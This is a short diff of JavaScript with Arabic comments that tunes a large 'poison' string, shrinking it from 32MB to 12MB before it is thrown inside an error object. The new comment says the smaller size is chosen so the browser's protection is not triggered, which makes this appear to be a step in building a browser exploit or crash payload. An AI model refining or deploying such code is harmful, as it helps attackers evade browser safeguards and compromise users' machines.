@@ -18,8 +18,10 @@
                 f.remove();
 
                 // بناء السلسلة تدريجياً لتجنب الـ OOM المفاجئ
-                let poison = 'A'.repeat(1024 * 1024 * 4); // 4MB
-                for(let i=0; i<3; i++) { poison += poison; } // زيادة تدريجية للوصول لـ 32MB
+                // تقليل الحجم لضمان عدم إطلاق حماية المتصفح (12MB)
+let poison = 'A'.repeat(1024 * 1024 * 3); // 3MB
+for(let i=0; i<2; i++) { poison += poison; } // (3 -> 6 -> 12MB)
+
 
                 throw {
                     line: 1,
